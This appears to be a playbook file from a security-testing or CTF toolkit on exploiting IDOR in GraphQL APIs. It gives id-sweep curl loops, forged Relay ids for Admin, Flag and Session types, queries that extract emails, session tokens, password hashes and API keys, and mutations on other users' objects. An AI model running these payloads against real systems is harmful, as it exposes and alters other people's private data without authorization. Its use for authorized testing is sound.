# IDOR through GraphQL — object reads without ownership

The most common GraphQL finding is boring on purpose: the endpoint exposes
`user(id:)`, `node(id:)`, or `document(id:)` and the resolver fetches by id
without checking the caller owns it. The single endpoint makes it look exotic;
the bug is plain IDOR — `skills/web-idor/` owns the class. This file is the
GraphQL carrier: which fields to hit, how ids hide, and how to prove the
cross-tenant read.

---

## 1. The read-field shapes

From the schema, every field that takes an identifier argument is a candidate:

```graphql
user(id: ID!): User
post(id: Int!): Post
order(orderId: String!): Order
document(uuid: UUID!): Document
node(id: ID!): Node            # Relay global object — see node-interface.md
nodes(ids: [ID!]!): [Node]!
file(name: String!): File
message(id: ID!, conversation: ID!): Message
account(number: Int!): Account
profile(username: String!): Profile
invite(code: String!): Invite
```

And list fields with per-item filters:

```graphql
users(filter: {id: ...}): [User]
search(q: String): [SearchResult]
files(owner: ID): [File]
```

## 2. Identifier forms — what to enumerate

| Arg type | Typical value space | Enumeration |
|---|---|---|
| `Int` | 1,2,3… | `id_sweep.py` over the int range |
| `ID` as int-as-string | `"1"`, `"2"` | same sweep, quoted |
| `ID` as Relay global id | `base64("User:42")` → `VXNlcjo0Mg==` | decode → mutate → re-encode |
| `UUID` | `9b2f...` — unguessable alone | hunt leaks first (§4) |
| `String` username | `alice` | user-enum wordlist |
| Composite `(id, owner)` | both args | try omitting the owner arg — resolvers often only check when present |
| Hashid / obfuscated | `xJ3kLp` | find the encoder in the bundle |

Repository enumeration loop — `id_sweep` walks the identifier space and
classifies responses:

```bash
# graphql-aware sweep — the query template carries {ID}
python3 tools/web/id_sweep.py --help   # check current flags first
# fallback: a small loop is fine — the oracle is data vs errors/null
for i in 1 2 3 4 5 10 100; do
  curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
    -H "Authorization: Bearer $MY_TOKEN" \
    -d "{\"query\":\"{user(id:$i){id username email role}}\"}" | jq -c .data
done
```

Classify each response:

- `{"user":{"id":5,"username":"bob","email":"bob@..."}}` while I am `id:2` →
  **cross-tenant read — the finding**.
- `{"user":null}` or `errors: not found` → id absent or filtered.
- `errors: not authorized` → authz present — then try the field variants
  (`authz-bypass.md`).

## 3. Relay global ids — the decode-mutate-reencode loop

Relay spec: `node(id: ID!)` accepts a global opaque id. The convention is
`base64("<TypeName>:<localId>")`:

```text
VXNlcjox  → "User:1"
VXNlcjo0Mg== → "User:42"
Q29udmVyc2F0aW9uOjc3Nw== → "Conversation:777"
```

Attack loop:

```bash
echo -n 'User:42' | base64        # → VXNlcjo0Mg==
echo -n 'Admin:1' | base64        # → QWRtaW46MQ==
echo -n 'Flag:1' | base64         # → RmxhZzox
echo -n 'Secret:0' | base64
```

```graphql
{ node(id:"VXNlcjo0Mg==") { ... on User { id username email role } } }
{ node(id:"QWRtaW46MQ==") { ... on Admin { apiKey } } }
```

The type name inside is attacker-controlled — `node()` is a *type-confusion
oracle*: ask for `Flag:1`, `Secret:1`, `Config:1`, `InternalConfig:1`. The
resolver looks up `type:table`/`id` — if the table exists, it returns it. Any
type named in introspection or leaked in errors is a candidate prefix:

```graphql
{node(id:"RmxhZzox") { ... on Flag { value } } }
{node(id:"U2Vzc2lvbjox") { ... on Session { token } } }
```

Read `node-interface.md` for the full Relay surface including `nodes(ids:[])` batching.

## 4. Unguessable ids — find the leak before brute force

UUID `document(uuid:)` can't be enumerated. Sources that leak other tenants'
uuids:

- **List fields without authz**: `documents(limit:100)` — read everyone's.
- **Search resolvers**: `search(q:"a")` returns documents with uuids attached.
- **Comments/activity feeds**: `recentActivity` carries `objectId` fields.
- **Error disclosure**: `{"query":"{document(uuid:\"x\")}"}` → error names the
  expected format or logs valid ids in `extensions`.
- **The other IDOR inside a read**: `user(id:2){documents{uuid}}` — a user
  listing hands you their document uuids.
- **Predictable UUIDs**: v1 (timestamp+MAC) UUIDs from the same server are
  correlatable — generate candidates around the observed timestamp.
- **`all`/`me` aliases**: `me{documents{uuid}}` for my own, then mutation —
  uuid reuse in another arg may skip the owner check (an object *reference*
  that is a guess is still a guess — but a uuid you *read* is not a guess).

## 5. Proving the read — evidence shape

A cross-tenant read is `confirms --evidence-kind impact`. The evidence must
quote *another user's* field from the verbatim response:

```bash
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql {user(id:5){email}} as token=user2' \
  --verdict confirms --evidence-kind impact --class web-graphql \
  --hypothesis-id h3 \
  --evidence '"user":{"id":5,"email":"victim@target.tld"}' \
  --response '<verbatim response body>'
```

The control: repeat the call with **your own** id and a **nonexistent** id —
three response classes (own, other, null) proves the boundary crossed, not a
public-profile feature. If `user(id:5)` returns the same fields for everyone
by design (public profile), it is *not* an impact — look for fields that are
private-shaped (`email`, `phone`, `token`, `ssn`, `role`, `passwordHash`,
`balance`).

## 6. Write-side IDOR — mutations on foreign objects

```graphql
mutation{ updatePost(id:7, title:"x"){ id } }
mutation{ deleteDocument(uuid:"<leaked>"){ ok } }
mutation{ transferOwnership(objectId:9, to:"me"){ ok } }
mutation{ addCollaborator(docId:5, user:"me"){ ok } }
```

Write IDOR is impact-plus: prove on an object you created first (safety rule
— never fire a broad mutation on a shared instance). Create `docA` as you,
try `updateDocument(id:docA)` as user2 — a write across the boundary on *your*
object proves the missing check without touching anyone's data.

## 7. Field-level authz — the subtler bug

Resolver checks `user(id)` exists-for-anyone but fields resolve without
per-field checks:

```graphql
{user(id:5){ username }}           # public — fine
{user(id:5){ email }}              # private field — leaks
{user(id:5){ sessions{token} }}    # nested private — leaks harder
{user(id:5){ passwordHash salt mfa secret }}
{user(id:5){ role permissions }}
{user(id:5){ apiKeys{key} }}
```

Enumerate the *field list* of the type, not just the object: a type whose
public profile is `username avatar` may still resolve `email` and `role` for
anyone who asks. The oracle is the same request with different selections —
compare which fields return data vs errors per role.

Nested-object escape: `user(id)` may check ownership but `post(id)`'s nested
`author{email}` resolves the same User type *without* the check — authz lives
at the entry resolver, not on the type. Probe every path that reaches each
sensitive type:

```graphql
{post(id:1){author{email}}}        # via Post → User
{comment(id:9){author{sessions{token}}}}
{search(q:"x"){... on User{email}}}
{feed{items{owner{email}}}}
```

## 8. Ledger and negative results

Record every authz-present field too — it is the falsifier for its sibling
classes:

```bash
python3 tools/state.py $CHAL --hypothesis "user(id) enforces ownership — field-level may not"
```

If every object field checks ownership, record the explicit negative via
`post-probe --verdict refutes` and pivot: mutations (`mutation-abuse.md`),
nested resolvers (§7), or the batching channels that skip middleware
(`batching-attacks.md` §authz-timing).
